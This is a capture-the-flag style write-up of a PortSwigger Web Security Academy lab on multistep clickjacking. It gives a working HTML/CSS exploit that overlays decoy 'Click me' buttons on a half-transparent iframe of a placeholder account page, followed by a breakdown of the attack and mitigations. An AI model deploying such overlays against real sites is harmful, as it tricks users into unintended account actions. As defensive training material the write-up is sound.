# Multistep Clickjacking

| Property       | Value                            |
| -------------- | -------------------------------- |
| **Category**   | Clickjacking                     |
| **Difficulty** | Practitioner                     |
| **Platform**   | PortSwigger Web Security Academy |
| **Status**     | ✅ Completed                      |

---

## Skills Demonstrated

* Clickjacking
* HTML & CSS
* Browser Security
* Multi-step Attack Design
* UI Redressing
* Security Testing

---

# Overview

This lab demonstrates a **multi-step clickjacking attack**, where a victim is manipulated into performing a sequence of actions rather than a single click. By carefully aligning multiple interface elements, an attacker can guide a user through several interactions that collectively achieve the attacker's objective.

Unlike basic clickjacking attacks, multi-step clickjacking requires precise positioning of multiple target elements and careful planning of the user's interaction flow.

---

# Lab Objective

Exploit a clickjacking vulnerability by tricking the victim into completing multiple sequential actions that result in a successful attack.

---

# Understanding the Vulnerability

Traditional clickjacking often relies on a single deceptive click. However, some sensitive workflows require multiple user interactions, such as confirming a change or completing a two-step process.

If the application can be embedded inside an iframe and lacks proper frame protection, an attacker can overlay multiple decoy elements to manipulate the victim through each required step.

This demonstrates that clickjacking attacks are not always limited to a single interaction.

---

# Solution Walkthrough

## Step 1 — Analyze the Workflow

The target functionality required multiple user interactions before the action was completed.

---

## Step 2 — Prepare the Attack Page

A malicious webpage was created that embedded the vulnerable application inside an iframe.

Two visible decoy buttons were positioned so that each click aligned with the corresponding action inside the hidden application.

---

## Step 3 — Execute the Attack

The victim first clicked the initial decoy element.

The second visible element then guided the victim to perform the next required action, completing the workflow and solving the lab.

---

# Exploit Code

```html
<style>
    iframe {
        position: relative;
        width: 1500px;
        height: 1000px;
        opacity: 0.5;
        z-index: 2;
    }

    .firstClick,
    .secondClick {
        position: absolute;
        top: 540px;
        left: 220px;
        z-index: 1;
    }

    .secondClick {
        top: 330px;
        left: 370px;
    }
</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>

<iframe src="https://LAB-URL/my-account"></iframe>
```

> **Note:** The original PortSwigger lab URL has been replaced with a generic placeholder while preserving the exploit structure. The exploit is based on the solution you used during the lab.

---

# Code Breakdown

### Multiple Decoy Elements

Two independent visible elements guide the victim through each required interaction.

### iframe

The legitimate application remains hidden underneath the attacker-controlled webpage.

### CSS Positioning

Each decoy element is carefully aligned with its corresponding target inside the iframe.

### User Interaction Flow

The attack succeeds because each user click advances the application's workflow until the final action is completed.

---

# Why the Attack Works

The application trusted that every user interaction represented an intentional action.

Because the browser continued sending authenticated requests from the legitimate application, every click was processed successfully, allowing the attacker to manipulate the victim through multiple steps.

---

# Real-World Impact

A multi-step clickjacking attack could be used to:

* Change account settings
* Enable or disable security features
* Authorize third-party applications
* Confirm financial transactions
* Perform administrative operations

These attacks become more convincing because each individual click appears harmless to the victim.

---

# Mitigation

Developers should implement:

* `X-Frame-Options`
* `Content-Security-Policy: frame-ancestors`
* Additional confirmation for sensitive workflows
* Re-authentication for high-risk actions
* Careful review of multi-step user interfaces

---

# Key Takeaways

* Clickjacking attacks can involve multiple sequential interactions.
* Attackers can manipulate complete workflows rather than isolated clicks.
* Browser security headers remain the most effective protection against iframe-based attacks.
* Critical business processes should require additional verification beyond simple button clicks.

---

# References

* PortSwigger Web Security Academy
* OWASP Clickjacking Defense Cheat Sheet

---

> **Disclaimer:** This write-up documents a PortSwigger Web Security Academy lab completed in an authorized training environment for educational purposes only.
